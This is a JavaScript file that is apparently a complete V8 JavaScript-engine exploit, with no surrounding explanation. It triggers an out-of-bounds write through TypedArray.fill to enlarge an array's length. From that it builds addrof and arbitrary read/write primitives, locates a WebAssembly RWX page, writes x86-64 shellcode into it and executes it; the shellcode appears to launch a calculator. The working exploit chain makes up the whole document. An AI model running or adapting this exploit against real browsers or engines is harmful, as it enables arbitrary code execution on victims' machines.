```javascript
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function hex(val) {
	return "0x" + val.toString(16);
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var tA1 = new Uint32Array(5);
var arr_one = [1.1,2.2,3.3];
var arr_two = [1.1];
var obj_arr = [arr_two,arr_two,arr_two,arr_two];
tA1[0] = 0x1337;
tA1[1] = 0x1447;

var tA2 = tA1.fill(0x20,33,34); //Trigger the bug, overwrite array length to large value :P
if(arr_one.length == 0x10) {
	console.log("[+] Succesfully overwrite length.");
}

var element_pointer = ftoi(arr_one[4]);
var array_map = ftoi(arr_one[3]);
var object_map = ftoi(arr_one[12]);

function addrof(object) {
	obj_arr[0] = object;
	arr_one[12] = itof(array_map);
	var addr_of_object = obj_arr[0];
	arr_one[12] = itof(object_map);
	return ftoi(addr_of_object);
}

function arb_read(address) {
	arr_one[8] = itof(address);
	return ftoi(arr_two[0]);
}

function arb_write(value,address) {
	arr_one[8] = itof(address);
	arr_two[0] = itof(value);
}

var addr_wasm_instance = addrof(wasm_instance);
var rwx_page = arb_read(addr_wasm_instance+0x60n);
console.log("[+] RWX: " + hex(rwx_page));

//Copy Shellcode
var buf = new ArrayBuffer(0x100);
var dataview = new DataView(buf);
var buff_addr = addrof(buf);
var backing_store = buff_addr+0xcn;
arb_write(rwx_page,backing_store);
var shellcode = [0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
for (var i = 0;i < shellcode.length; i++) {
	dataview.setUint32(4*i,shellcode[i],true);
}
f();
```
